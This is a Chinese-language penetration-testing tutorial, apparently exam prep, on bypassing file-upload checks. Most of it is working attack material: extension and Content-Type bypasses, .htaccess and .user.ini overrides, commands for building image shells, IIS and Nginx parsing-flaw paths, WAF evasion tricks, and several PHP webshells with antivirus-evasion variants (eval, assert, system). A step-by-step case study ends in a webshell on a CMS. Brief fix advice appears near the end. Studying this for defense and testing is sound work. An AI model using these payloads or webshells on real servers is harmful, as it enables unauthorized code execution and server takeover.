# 文件上传绕过全系列实战

> **📘 文档定位**：CISP 考试 渗透测试 核心 | 难度：⭐⭐⭐⭐ | 预计阅读：28 分钟
>
> 系统讲解文件上传漏洞的全系列绕过技术：前端JS绕过/MIME类型/扩展名黑名单/.htaccess/图片马/条件竞争/解析漏洞，是 Web 渗透的必修课。

---

## 导航目录

- [一、文件上传漏洞基础](#一文件上传漏洞基础)
- [二、前端绕过技术](#二前端绕过技术)
- [三、后端校验绕过](#三后端校验绕过)
- [四、解析漏洞利用](#四解析漏洞利用)
- [五、高级绕过技巧](#五高级绕过技巧)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 📋 目录

1. [漏洞原理与危害](#一漏洞原理)
2. [前端JS校验绕过](#二前端绕过)
3. [Content-Type校验绕过](#三content-type绕过)
4. [扩展名校验绕过](#四扩展名绕过)
5. [文件内容校验绕过](#五内容校验绕过)
6. [解析漏洞利用](#六解析漏洞)
7. [WAF绕过技巧](#七waf绕过)
8. [WebShell免杀与连接](#八webshell免杀)
9. [完整案例：某CMS上传漏洞挖掘](#九完整案例)
10. [防御方案](#十防御方案)

---

## 一、漏洞原理

```
文件上传漏洞 = 服务端未充分校验用户上传的文件
→ 攻击者上传恶意脚本(WebShell) → 服务器执行

危害链：
  上传 PHP/JSP/ASPX Shell → 执行系统命令
  → 反弹Shell → 内网渗透 → 完全控制服务器

核心检测点（绕过从易到难）：
  L1: 前端JS校验      — 改请求包绕过
  L2: Content-Type    — 修改MIME类型
  L3: 扩展名黑名单     — 大小写/特殊扩展名
  L4: 扩展名白名单     — 解析漏洞利用
  L5: 文件头内容       — 图片马
  L6: 服务器端渲染     — 二次渲染绕过
```

---

## 二、前端JS绕过

### 2.1 经典案例

```javascript
// ❌ 不安全的纯前端校验
function checkFile() {
    var file = document.getElementById('file').value;
    var ext = file.substring(file.lastIndexOf('.') + 1);
    if (ext !== 'jpg' && ext !== 'png' && ext !== 'gif') {
        alert('只能上传图片文件！');
        return false;
    }
    return true;
}
// 攻击者：直接用 Burp 拦截请求 → 修改文件名 → 绕过
```

### 2.2 绕过方法

```
方法1: Burp Suite 抓包修改
  ① 正常上传 shell.jpg
  ② Burp 拦截 → 修改 filename 为 shell.php
  ③ Forward → 成功上传

方法2: 禁用 JavaScript
  浏览器设置 → 禁用JS → 直接提交 shell.php

方法3: 直接 POST 请求
  curl -F "file=@shell.php" https://xxx.com/upload.php
```

---

## 三、Content-Type 绕过

### 3.1 服务端误判型

```php
// ❌ 不安全：只检查 Content-Type
if ($_FILES['file']['type'] == 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $_FILES['file']['name']);
}
```

### 3.2 绕过

```
方法：修改 HTTP 请求中的 Content-Type

原本:  Content-Type: application/octet-stream
改为:  Content-Type: image/jpeg

Burp: Proxy → Intercept → 修改 Content-Type → Forward
```

```bash
# curl 命令行绕过
curl -X POST https://xxx.com/upload.php \
  -F "file=@shell.php;type=image/jpeg"
```

---

## 四、扩展名绕过

### 4.1 黑名单绕过全集

```php
// 典型黑名单
$blacklist = ['php', 'php3', 'php4', 'php5', 'phtml', 'asp', 'aspx', 'jsp'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);
if (in_array($ext, $blacklist)) {
    die('不允许的文件类型');
}
```

**绕过矩阵：**

| 方法 | Payload | 适用场景 |
|------|---------|---------|
| 大小写 | `shell.Php` `shell.pHp` | Windows 不区分大小写 |
| 空格 | `shell.php ` → `shell.php` | Windows自动去尾空格 |
| 点号 | `shell.php.` → `shell.php` | Windows自动去尾点 |
| 双写 | `shell.pphphp` → `shell.php` | 替换逻辑缺陷 |
| 特殊扩展名 | `shell.php5` `shell.phtml` | Apache解析 |
| ::$DATA | `shell.php::$DATA` | Windows NTFS特性 |
| %00截断 | `shell.php%00.jpg` | PHP<5.3.4 |

### 4.2 实战案例

```bash
# 案例1: Apache 解析 php5
# 上传 shell.php5 → Apache httpd.conf 中可能配置了:
#   AddType application/x-httpd-php .php .php5 .phtml
# → shell.php5 被当成 PHP 执行！

# 案例2: 空格绕过 (Windows)
# 上传 "shell.php " (文件名末尾有空格)
# Windows 自动去除尾空格 → 保存为 shell.php

# 案例3: 双重扩展名 (Apache)
# 上传 shell.php.jpg
# Apache 从右向左解析: .jpg 不认识 → .php 认识！
# → 以 PHP 执行
# 前提: Apache 配置了 AddHandler 或 AddType

# 案例4: 点号绕过 (Windows)  
# 上传 shell.php.
# Windows 自动去除尾点 → 保存为 shell.php
```

### 4.3 .htaccess 覆盖（Apache）

```
如果能上传 .htaccess 文件，可以将任意扩展名映射为 PHP:

.htaccess 内容:
  AddType application/x-httpd-php .jpg
  # 所有 .jpg 文件将被当作 PHP 执行

然后上传 shell.jpg → 访问 → 执行 PHP

或更隐蔽:
  <FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
  </FilesMatch>
```

### 4.4 .user.ini（PHP-FPM）

```
如果目标是 PHP-FPM + Nginx，可上传 .user.ini:

.user.ini 内容:
  auto_prepend_file = shell.jpg
  # 所有 PHP 文件执行前自动包含 shell.jpg

攻击链:
  ① 上传图片马 shell.jpg（含PHP代码的图片）
  ② 上传 .user.ini（指向 shell.jpg）
  ③ 访问任意正常 PHP 文件 → 自动执行 shell.jpg 中的代码
```

---

## 五、文件内容校验绕过

### 5.1 getimagesize 校验

```php
// getimagesize 可读取图片尺寸，非图片 → 返回 false
$info = getimagesize($_FILES['file']['tmp_name']);
if (!$info) {
    die('不是有效的图片文件');
}
// 攻击：在文件头添加真实图片头 → 绕过
```

```bash
# 制作图片马
# 方法1: 直接拼接
copy /b image.jpg + shell.php shell.jpg

# 方法2: exiftool 嵌入
exiftool -Comment='<?php @eval($_POST[cmd]);?>' image.jpg

# 方法3: 直接编辑
# 用 010 Editor 打开图片 → 在末尾添加:
# <?php @eval($_POST[cmd]);?>
```

### 5.2 图片二次渲染绕过

```
某些CMS会对上传图片进行二次渲染（压缩/裁剪）
→ 插入的 PHP 代码可能被破坏

绕过方法：
  GIF：比较渲染前后的差异，在不被修改的区域插入代码
  PNG：利用 IDAT 数据块插入
  JPG：利用 EXIF/Comment 段插入

工具：
  https://github.com/hotpot7731/bypass-av-upload
```

---

## 六、解析漏洞

### 6.1 IIS 解析漏洞

```
IIS 6.0:
  /upload/shell.asp;.jpg → 被当作 ASP 解析
  /upload/shell.asp/anything.jpg → 被当作 ASP 解析
  /upload/1.asp/shell.jpg → 目录名含 .asp → 目录下所有文件当ASP解析

IIS 7.0/7.5:
  shell.jpg → 正常图片
  shell.jpg/.php → FastCGI 配置不当 → 被当作 PHP 解析
```

### 6.2 Nginx 解析漏洞

```
Nginx 配置不当:
  location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
  }
  # 只匹配 .php 结尾的 URL → 以下URL也会被PHP-FPM处理:

  /upload/shell.jpg/shell.php
  /upload/shell.jpg%00.php
  
  如果 PHP-FPM 配置了 security.limit_extensions = .php .jpg
  → 即使文件是 .jpg 也可能被执行（罕见）
```

---

## 七、WAF 绕过

```
文件上传 WAF 绕过技巧：

1. 文件名换行
   filename="shell.php"  → filename="shell.\np\nh\np"
   (HTTP 头部可以包含换行符)

2. 多个 filename 参数
   filename="shell.jpg"; filename="shell.php"
   后端可能取第二个

3. multipart/form-data 边界混淆
   Content-Type: multipart/form-data; boundary=----WebKit

4. 超大文件名
   filename="A"*5000 + ".php"
   某些WAF对超长文件名检测失效

5. Content-Disposition 混淆
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Disposition: form-data ; name="file"; filename="shell.php" (额外空格)
```

---

## 八、WebShell 免杀与连接

```php
// === 一句话木马 (基础版) ===
<?php @eval($_POST['cmd']);?>

// === 免杀变种 ===
// 1. 变量函数
<?php $a='ass';$b='ert';$a=$a.$b;$a($_POST['x']);?>
// 等效: assert($_POST['x']);

// 2. 回调函数
<?php array_map('assert', array($_POST['x']));?>

// 3. 动态函数
<?php 
$f=$_POST['f']; $p=$_POST['p']; 
$f($p); 
?>
// POST: f=system&p=whoami

// 4. 拼接绕过
<?php 
$a = 's' . 'y' . 's' . 't' . 'e' . 'm';
$a($_GET['cmd']);
?>

// 5. 反射
<?php 
$ref = new ReflectionFunction('system');
$ref->invoke($_GET['cmd']);
?>
```

```
连接工具:
  中国蚁剑 (AntSword) — 最常用，插件丰富
  哥斯拉 (Godzilla) — 加密流量，过WAF
  冰蝎 (Behinder) — 动态密钥协商
  Weevely — 类Metasploit的PHP后渗透框架
```

---

## 九、完整案例

```
目标: 某企业CMS系统，头像上传功能

Step 1: 信息收集
  正常上传 test.png → 成功
  访问路径: https://xxx.com/uploads/avatar/test.png
  Web服务器: Nginx 1.18 + PHP 7.2

Step 2: 检测防御机制
  上传 test.php → "只能上传图片格式"
  → 存在扩展名校验

Step 3: 绕过尝试
  尝试1: test.pHp → 失败 (后端转小写)
  尝试2: test.php5 → 失败 (黑名单含php5)
  尝试3: test.php.jpg → 上传成功！→ 图片正常显示 (PHP代码未执行)
  
Step 4: Nginx 解析漏洞尝试
  直接访问: /uploads/avatar/test.php.jpg → 图片内容
  尝试: /uploads/avatar/test.php.jpg/shell.php → 500错误
  尝试: /uploads/avatar/test.php.jpg/.php → 502错误
  
Step 5: .user.ini 攻击
  上传 .user.ini:
    auto_prepend_file = shell.jpg
    → 成功！
  
  制作图片马 shell.jpg (GIF89a头 + PHP代码)
  上传 shell.jpg → 成功！
  
  访问任意正常PHP: /uploads/avatar/index.php
  → shell.jpg 中的PHP代码自动执行！
  → 成功获得 WebShell！

修复方案:
  ① 上传目录禁止执行 PHP (nginx: location ~ \.php$ { deny all; })
  ② 返回随机文件名 (不带扩展名)
  ③ 图片二次渲染后保存(去除所有非图像数据)
```

---

## ✅ Checklist

- [ ] 检测上传功能（前端JS/后端校验）
- [ ] 尝试扩展名绕过（大小写/空格/.php5/.phtml等）
- [ ] 尝试 Content-Type 绕过
- [ ] 尝试双重扩展名(.php.jpg)
- [ ] 测试 .htaccess / .user.ini 上传
- [ ] 测试解析漏洞(IIS/Nginx/Apache)
- [ ] 制作图片马绕过内容校验
- [ ] 获取 WebShell → 稳定连接
- [ ] 测试 WAF 绕过
